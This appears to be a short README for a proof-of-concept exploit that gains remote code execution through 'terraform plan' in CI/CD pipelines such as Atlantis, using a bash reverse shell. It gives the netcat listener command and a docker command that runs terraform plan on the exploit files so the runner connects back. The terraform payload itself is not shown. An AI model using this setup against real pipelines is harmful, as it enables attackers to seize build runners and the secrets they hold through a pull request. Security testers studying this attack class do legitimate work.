
# Overview
Src - https://alex.kaskaso.li/post/terraform-plan-rce

But with bash reverse shell, as on terraform runner (e.g. atlantis container) you might not get python.
Following exploit can be tested on CI/CD pipeline that is running `terraform plan` on each commit to git repository, when Pull Request is open for branch.


# Testing with atlantis locally

## One terminal tab (either locally or on different host)
```bash
nc -vklp  4242
```

## Second terminal tab (either same host or remote host)

```bash
# `--net=host` is only needed if you want to connect to same host, where docker container is running
# Then in exploit, you need to use as remote address `host.docker.internal` as equivalent to `localhost` pointing from container to its host system
# ghcr.io/runatlantis/atlantis@sha256:5cced9af236abd0743018e41fbe1b574a0bb739c0566102628f4c7553945cffc
docker run --net=host -v "$(pwd)":/app -it ghcr.io/runatlantis/atlantis bash -c "cd /app; terraform init; terraform plan"
```
